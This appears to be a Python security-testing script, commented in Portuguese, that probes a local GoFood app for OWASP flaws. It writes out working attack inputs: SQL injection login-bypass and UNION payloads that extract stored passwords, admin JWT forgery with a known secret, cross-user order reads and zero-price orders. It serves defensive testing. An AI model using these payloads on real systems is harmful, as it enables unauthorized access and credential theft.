#!/usr/bin/env python3
"""
DAST probe para o servidor GoFood (executado contra instancia LOCAL).
Testa dinamicamente vetores OWASP e registra evidencias. Nao e um fuzzer completo
como o ZAP, mas executa requisicoes reais e avalia as respostas do servidor vivo.
"""
import requests, json, sys, jwt as pyjwt

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
TIMEOUT = 5
findings = []

def rec(vid, name, owasp, status, evidence):
    findings.append(dict(id=vid, name=name, owasp=owasp, status=status, evidence=evidence))

def get(path, **kw):
    try: return requests.get(BASE+path, timeout=TIMEOUT, **kw)
    except Exception as e: return None
def post(path, **kw):
    try: return requests.post(BASE+path, timeout=TIMEOUT, **kw)
    except Exception as e: return None

# --- baseline login (usuario comum) ---
r = post("/api/login", json={"email":"user@gofood.com","password":"user123"})
normal_token = None
if r is not None and r.status_code == 200 and "token" in r.text:
    normal_token = r.json().get("token")

# === V2: SQL Injection no login (bypass de autenticacao) ===
r = post("/api/login", json={"email":"x' OR '1'='1' --","password":"z"})
if r is not None and r.status_code == 200 and r.json().get("role") == "admin":
    rec("V2","SQL Injection / auth bypass no login","A03","VULNERAVEL",
        f"Payload \"' OR '1'='1' --\" retornou token com role=admin (HTTP 200)")
else:
    rec("V2","SQL Injection / auth bypass no login","A03","OK",
        f"Payload rejeitado (HTTP {getattr(r,'status_code','n/a')})")

# === V1/V3/V4: JWT — secret fraco, sem exp, role no body ===
if normal_token:
    body_has_role = "role" in (r.text if r else "")
    # tenta forjar token admin com o secret conhecido
    forged = pyjwt.encode({"userId":1,"role":"admin","email":"admin@gofood.com"}, "gofood2024secret", algorithm="HS256")
    rr = get("/api/admin/orders", headers={"Authorization": forged})
    if rr is not None and rr.status_code == 200:
        rec("V1","Secret JWT hardcoded permite forjar token","A02","VULNERAVEL",
            "Token forjado com secret 'gofood2024secret' foi aceito em /api/admin/orders (HTTP 200)")
    else:
        rec("V1","Secret JWT hardcoded","A02","OK","Token forjado rejeitado")
    # exp?
    dec = pyjwt.decode(normal_token, options={"verify_signature":False})
    if "exp" not in dec:
        rec("V3","JWT sem expiracao","A07","VULNERAVEL", f"Token nao contem claim 'exp': {list(dec.keys())}")
    else:
        rec("V3","JWT sem expiracao","A07","OK","Token contem exp")
    # role exposto no body do login
    lr = post("/api/login", json={"email":"user@gofood.com","password":"user123"})
    if lr is not None and "role" in lr.text and "token" in lr.text:
        rec("V4","Role/token expostos no body da resposta","A02","VULNERAVEL",
            "Resposta do /login inclui token e role em texto no corpo")
    else:
        rec("V4","Role/token no body","A02","OK","Body nao expoe token/role")

# === V7: IDOR — ler pedido de outro usuario ===
if normal_token:
    rr = get("/api/orders/2", headers={"Authorization": normal_token})  # pedido do admin (user_id=1)
    if rr is not None and rr.status_code == 200 and "total" in rr.text:
        rec("V7","IDOR: pedido de outro usuario acessivel","A01","VULNERAVEL",
            "Usuario comum (id=2) leu /api/orders/2 (pedido do admin) — sem ownership check")
    else:
        rec("V7","IDOR em /orders/:id","A01","OK", f"Acesso negado (HTTP {getattr(rr,'status_code','n/a')})")

# === V6: SQL Injection via UNION na rota de pedidos ===
if normal_token:
    payload = "1 UNION SELECT id, email, password, role, NULL, NULL FROM users --"
    rr = get("/api/orders/"+requests.utils.quote(payload), headers={"Authorization": normal_token})
    if rr is not None and rr.status_code == 200 and "password" in rr.text:
        rec("V6","SQL Injection (UNION) vaza credenciais","A03","VULNERAVEL",
            "UNION SELECT retornou coluna 'password' de users via /api/orders/:id")
    else:
        rec("V6","SQL Injection (UNION) em /orders/:id","A03","OK",
            f"UNION nao retornou credenciais (HTTP {getattr(rr,'status_code','n/a')})")

# === V10: Broken Access Control — admin sem checar role ===
if normal_token:
    rr = get("/api/admin/orders", headers={"Authorization": normal_token})
    if rr is not None and rr.status_code == 200 and "[" in rr.text:
        rec("V10","Painel admin acessivel a usuario comum","A01","VULNERAVEL",
            "Token de role=customer acessou /api/admin/orders (HTTP 200)")
    else:
        rec("V10","Authz em /admin/orders","A01","OK", f"Acesso negado (HTTP {getattr(rr,'status_code','n/a')})")

# === V9: preco vindo do cliente ===
if normal_token:
    rr = post("/api/orders", headers={"Authorization": normal_token},
              json={"items":[{"price":0,"qty":1,"productId":"x"}],"address":"Rua Z"})
    if rr is not None and rr.status_code == 200 and "success" in rr.text:
        rec("V9","Preco definido pelo cliente (price=0 aceito)","A04","VULNERAVEL",
            "Pedido com item price=0 foi aceito (HTTP 200) — preco nao validado no servidor")
    else:
        rec("V9","Preco do cliente","A04","OK", f"Rejeitado (HTTP {getattr(rr,'status_code','n/a')})")

# === V16: CORS aberto ===
r = get("/api/login", headers={"Origin":"https://evil.com"})
# usa OPTIONS/preflight
r2 = requests.options(BASE+"/api/login", headers={"Origin":"https://evil.com","Access-Control-Request-Method":"POST"}, timeout=TIMEOUT) if True else None
acao = (r2.headers.get("Access-Control-Allow-Origin") if r2 is not None else None)
if acao == "*" or acao == "https://evil.com":
    rec("V16","CORS aceita qualquer origem","A05","VULNERAVEL", f"Access-Control-Allow-Origin: {acao}")
else:
    rec("V16","CORS","A05","OK", f"ACAO restrito: {acao}")

# === V19: headers de seguranca (helmet) ausentes ===
r = get("/api/login")
if r is not None:
    hsts = "Strict-Transport-Security" in r.headers
    xframe = "X-Frame-Options" in r.headers
    powered = r.headers.get("X-Powered-By")
    # helmet: adiciona HSTS + X-Frame-Options e REMOVE X-Powered-By
    if not hsts and not xframe and powered:
        rec("V19","Headers de seguranca ausentes (sem helmet)","A05","VULNERAVEL",
            f"Sem HSTS, sem X-Frame-Options, e X-Powered-By={powered} exposto")
    else:
        rec("V19","Security headers","A05","OK", "HSTS+X-Frame presentes, X-Powered-By removido")

# === V18: sem rate limiting no login ===
codes = []
for _ in range(12):
    rr = post("/api/login", json={"email":"user@gofood.com","password":"errada"})
    codes.append(getattr(rr,"status_code","n/a"))
if 429 not in codes:
    rec("V18","Sem rate limiting no login","A07","VULNERAVEL", f"12 tentativas seguidas, nenhum HTTP 429 (brute-force livre)")
else:
    rec("V18","Rate limiting no login","A07","OK", "HTTP 429 apos varias tentativas")

# === V20: stack trace vazado ===
r = post("/api/orders", headers={"Authorization": normal_token or "x"}, json={"bad":"input"})
if r is not None and ("stack" in r.text.lower() or "    at " in r.text):
    rec("V20","Stack trace exposto em erro","A05","VULNERAVEL", "Resposta de erro contem 'stack'/traceback")
else:
    rec("V20","Stack trace em erros","A05","OK", f"Erro sem stack (HTTP {getattr(r,'status_code','n/a')})")

print(json.dumps(findings, ensure_ascii=False, indent=2))
